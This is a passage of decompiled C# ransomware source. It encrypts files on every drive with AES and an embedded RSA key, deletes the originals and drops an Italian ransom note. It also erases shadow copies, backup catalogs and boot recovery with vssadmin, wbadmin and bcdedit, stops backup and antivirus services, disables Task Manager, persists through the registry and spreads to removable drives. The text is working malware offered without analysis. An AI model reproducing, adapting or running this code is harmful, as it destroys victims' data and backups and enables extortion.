6jTB6j6jXr5yLz2xN70neNTnIvPbE3vSd41B5MHqPqNMHqPqNevnIvPbE3vSd41Oci89sTe9J3jUHkweo+o0weo+o16+ci89sTe9J3jU5yLz2xN70neNQeTB6j6jTB6j6jXr5yLz2xN70neNTnIvPbE3vSd41B5MHqPqNMHqPqNevnIvPbE3vSd41Oci89sTe9J3jUHkweo+o0weo+o16+ci89sTe9J3jU5yLz2xN70neNQeTB6j6jTB6j6jXr5yLz2xN70neNTnIvPbE3vSd41B5MHqPqNMHqPqNevnIvPbE3vSd41Oci89sTe9J3jUHkweo+o0IzuI3fUa9fORee2Jvek7xqc5F57Ym96TvGoN0cEHGbuthZbhyWxeYLSQhlqS4piUwhKcJbbmJbWVNjAwHELIGQDjAHm42XDDD2wZtfkUJ+NIgrfLq5aY2ktvpby20pl5RUNbYO8J6BWoOci89sTe9J3jU5yLz2xN70neNQY35Kvo0H/hOPXXUXE44WrVspa7si6BxMyTLacbTHjLeXIYbYKW0a0+anS4XvlkAct9JrQPORee2Jvek7xqc5F57Ym96TvGoOjuFPjczpzbsaxxfclpeU+WvrS/PLZBBLbSU8jEc39Op0jGQQejmuXIW84488pTrzy1OOuuFS3HHFnKlrWrepRPpNVuci89sTe9J3jU5yLz2xN70neNQeT1+o0z/jBr1jhJvPbM3vWd41S5zL121O72n+NQeL/HQaf46DXt5zL121O72n+NTnMvXbU7vaf41B4v8dBp/joNe3nMvXbU7vaf41Ocy9dtTu9p/jUHi/x0Gn+Og17ecy9dtTu9p/jU5zL121O72n+NQeLP+MGqereKuPOZeu2p3e0/xq8K9tLkolSrlJKiSSTPlEknpJJc3mgsNKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoFKUoP//Z";

	public static string appMutexStartup = "1qrx0frdqdur0lllc6ezm";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = false;

	private static bool checkdeleteShadowCopies = false;

	private static bool checkdisableRecoveryMode = false;

	private static bool checkdeleteBackupCatalog = false;

	private static bool disableTaskManager = false;

	private static bool checkStopBackupServices = false;

	public static string appMutexStartup2 = "19DpJAWr6NCVT2";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> messages = new List<string> { "ʜᴇʏ ɴᴏɴ ᴛɪ ᴘʀᴇᴏᴄᴄᴜᴘᴀʀᴇ ᴛᴜᴛᴛɪ ɪ ᴛᴜᴏɪ ꜰɪʟᴇ ꜱᴏɴᴏ ᴄʀʏᴘᴛᴀᴛʏ ꜱᴇ ᴠᴜᴏɪ ʀɪᴀᴠᴇʀʟɪ ᴄᴏɴᴛᴀᴛᴛᴀᴄɪ Qᴜɪ ", "ʙʟᴀʜ ʙʟᴀʜ ʙʟᴀʜ ʙʟᴀʜ ", "ʜᴀʜᴀʜᴀʜᴀʜʜᴀʜᴀᴀʜ ɴᴏɴ ʀɪᴀᴠʀᴀɪ ᴍᴀɪ ɪ ᴛᴜᴏɪ ꜰɪʟᴇ ꜰᴀɪ ᴘɪᴜ ᴀᴛᴛᴇɴᴢɪᴏɴᴇ ʟᴀ ᴘʀᴏꜱꜱɪᴍᴀ ᴠᴏʟᴛᴀ ᴛᴇꜱᴛᴀ ᴅɪ ᴄᴀᴢᴢᴏ.)" };

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		if (forbiddenCountry())
		{
			MessageBox.Show("Forbidden Country");
			return;
		}
		if (RegistryValue())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
		}
		if (isOver())
		{
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			registryStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
			if (checkStopBackupServices)
			{
				stopBackupServices();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static bool forbiddenCountry()
	{
		string[] array = new string[2] { "az-Latn-AZ", "tr-TR" };
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				string name = InputLanguage.CurrentInputLanguage.Culture.Name;
				if (name == text)
				{
					return true;
				}
			}
			catch
			{
			}
		}
		return false;
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool RegistryValue()
	{
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + appMutexRun2);
			object value = registryKey.GetValue(appMutexRun2);
			registryKey.Close();
			if (value.ToString().Length > 0)
			{
				return false;
			}
			return true;
		}
		catch
		{
			return true;
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool checkCrypted = true;
			Parallel.For(0, files.Length, delegate(int i)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (Array.Exists(validExtensions, (string E) => E == extension.ToLower()) && fileName != droppedMessageTextbox)
					{
						FileInfo fileInfo = new FileInfo(files[i]);
						try
						{
							fileInfo.Attributes = FileAttributes.Normal;
						}
						catch
						{
						}
						string text = CreatePassword(40);
						if (fileInfo.Length < 2368709120u)
						{
							if (checkDirContains(files[i]))
							{
								string keyRSA = RSA_Encrypt(text, rsaKey());
								AES_Encrypt(files[i], text, keyRSA);
							}
						}
						else
						{
							AES_Encrypt_Large(files[i], text, fileInfo.Length);
						}
						if (checkCrypted)
						{
							checkCrypted = false;
							string path = location + "/" + droppedMessageTextbox;
							string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
							if (!File.Exists(path) && location != folderPath)
							{
								File.WriteAllLines(path, messages);
							}
						}
					}
				}
				catch (Exception)
				{
				}
			});
			string[] childDirectories = Directory.GetDirectories(location);
			Parallel.For(0, childDirectories.Length, delegate(int i)
			{
				try
				{
					new DirectoryInfo(childDirectories[i]).Attributes &= ~FileAttributes.Normal;
				}
				catch
				{
				}
				encryptDirectory(childDirectories[i]);
			});
		}
		catch (Exception)
		{
		}
	}

	private static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[16]
		{
			"appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData", "boot.ini", "bootfont.bin", "boot.ini", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
			"ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
		};
		string[] array2 = array;
		foreach (string value in array2)
		{
			if (directory.Contains(value))
			{
				return false;
			}
		}
		return true;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>6SOCrjtC8KFk1p21GwSKMOJd3a6Em5C1XX/eqkUufyn4gG0YPO87ubAF6DEmikC2Y7ndZ8uPO31+PZDe2aaP0Bmx7lZX/KI3U/nx/26A/9OaeD9UiWVNVP1uR3mQraONZ/hOHRxgLazaxe0BkV0LODAq3WulALKjh6ylQdaKpMANyOX8UOtm/6t+m7rHm4m5iPsAoA0XjgNPbubyCwYmC3VO4pyZ7Okenc4oz+SB59VEUQ2gepvCulcs/H1fMeSulporznsJ4kOzZAXQlar/XnFET3W+yFsnpf9CUMqY5U0lxb+i3S1M7yA6+TSDzV8vmZ7AEWKS0hBW7A/inqZgJQ==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + "." + RandomStringForExtension(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 128;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string pathRoot = Path.GetPathRoot(Environment.SystemDirectory);
			if (driveInfo.ToString() == pathRoot)
			{
				string[] array = new string[12]
				{
					"Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache", "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD",
					"NVIDIA", "ProgramData"
				};
				string[] directories = Directory.GetDirectories(pathRoot);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		byte[] bytes = File.ReadAllBytes(location);
		if (!File.Exists(text2))
		{
			File.WriteAllBytes(text2, bytes);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.WriteAllBytes(text2, bytes);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("UpdateTask", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != Path.GetPathRoot(Environment.SystemDirectory) && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private static void stopBackupServices()
	{
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0190: Expected O, but got Unknown
		string[] array = new string[42]
		{
			"BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine", "BackupExecManagementService", "vss", "sql", "svc$", "memtas", "sophos", "veeam",
			"backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr", "DefWatch", "ccEvtMgr", "SavRoam", "RTVscan",
			"QBFCService", "Intuit.QuickBooks.FCS", "YooBackup", "YooIT", "zhudongfangyu", "sophos", "stc_raw_agent", "VSNAPVSS", "QBCFMonitorService", "VeeamTransportSvc",
			"VeeamDeploymentService", "VeeamNFSSvc", "veeam", "PDVFSService", "BackupExecVSSProvider", "BackupExecAgentAccelerator", "BackupExecRPCService", "AcrSch2Svc", "AcronisAgent", "CASAD2DWebSvc",
			"CAARCUpdateSvc", "TeamViewer"
		};
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				ServiceController val = new ServiceController(text);
				val.Stop();
			}
			catch
			{
			}
		}
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
